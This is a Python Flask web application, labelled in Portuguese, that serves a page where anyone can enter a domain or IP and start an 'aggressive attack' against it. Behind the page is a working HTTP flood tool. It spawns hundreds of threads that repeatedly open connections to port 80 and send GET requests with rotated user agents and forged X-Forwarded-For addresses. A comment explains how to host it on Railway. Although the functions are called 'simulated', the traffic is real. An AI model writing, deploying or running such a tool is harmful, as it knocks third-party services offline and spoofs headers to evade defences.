from flask import Flask, request
import threading
import socket
import random
import time
import os

app = Flask(__name__)

contador = 0
ataque_ativo = False
alvo_host = ""

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
    "curl/7.68.0", "python-requests/2.25.1"
]

def gerar_ip_falso():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def simular_conexao(host):
    global contador, ataque_ativo
    while ataque_ativo:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))

            fake_ip = gerar_ip_falso()
            user_agent = random.choice(user_agents)

            headers = f"GET / HTTP/1.1\r\n" \
                      f"Host: {host}\r\n" \
                      f"User-Agent: {user_agent}\r\n" \
                      f"X-Forwarded-For: {fake_ip}\r\n" \
                      f"Accept: */*\r\n" \
                      f"Connection: keep-alive\r\n\r\n"

            for _ in range(50):
                if not ataque_ativo:
                    break
                s.sendall(headers.encode('utf-8'))
                contador += 1
            s.close()
        except:
            pass

def ataque_simulado(host):
    for _ in range(500):
        if not ataque_ativo:
            break
        t = threading.Thread(target=simular_conexao, args=(host,))
        t.daemon = True
        t.start()
        time.sleep(0.001)

@app.route('/')
def index():
    return f'''
    <html>
        <head><title>Simulador Agressivo</title></head>
        <body style="font-family: Arial; text-align: center; margin-top: 60px;">
            <h1>🔥 Ataque Agressivo com Alvo Personalizado</h1>
            <form action="/start" method="post">
                <input type="text" name="host" placeholder="Digite o domínio ou IP" style="font-size: 18px; padding: 10px; width: 300px;" required>
                <br><br>
                <button type="submit" style="font-size: 18px; background: green; color: white; padding: 10px 20px; border: none; border-radius: 5px;">🚀 Iniciar Ataque</button>
            </form>
            <br><br>
            <a href="/stop" style="font-size: 18px; background: red; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">🛑 Parar Ataque</a>
            <br><br>
            <p>Requisições enviadas: <strong>{contador}</strong></p>
        </body>
    </html>
    '''

@app.route('/start', methods=['POST'])
def start():
    global ataque_ativo, alvo_host, contador
    alvo_host = request.form['host'].strip().replace("http://", "").replace("https://", "").split("/")[0]
    if not alvo_host:
        return "❌ Alvo inválido."
    try:
        socket.gethostbyname(alvo_host)
    except socket.gaierror:
        return f"❌ Não foi possível resolver o domínio: {alvo_host}"
    ataque_ativo = True
    contador = 0
    threading.Thread(target=ataque_simulado, args=(alvo_host,)).start()
    return f'''
    <html>
        <body style="text-align: center; font-family: Arial; margin-top: 60px;">
            <h2>✅ Ataque iniciado contra: <strong>{alvo_host}</strong></h2>
            <meta http-equiv="refresh" content="2; url=/" />
        </body>
    </html>
    '''

@app.route('/stop')
def stop():
    global ataque_ativo
    ataque_ativo = False
    return '''
    <html>
        <body style="text-align: center; font-family: Arial; margin-top: 60px;">
            <h2>🛑 Ataque encerrado.</h2>
            <meta http-equiv="refresh" content="2; url=/" />
        </body>
    </html>
    '''

# ✅ ESSA PARTE É A CORREÇÃO IMPORTANTE PARA RODAR NO RAILWAY:
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
